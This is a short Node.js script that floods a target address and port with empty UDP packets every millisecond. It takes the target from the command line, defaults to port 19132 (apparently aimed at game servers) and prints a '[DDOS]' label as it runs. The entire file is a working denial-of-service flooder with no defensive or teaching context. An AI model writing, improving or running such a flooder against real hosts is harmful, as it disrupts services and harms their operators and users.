const dgram = require('dgram');
const client = dgram.createSocket('udp4');

const args = process.argv;

const address = args[2] ?? 'localhost'
const port = args[3] ?? 19132

setInterval(() => {
    client.send('', 0, 0, port, address);
    console.log(`[DDOS] Sending packets to ${address}:${port}...`)
}, 1)
    
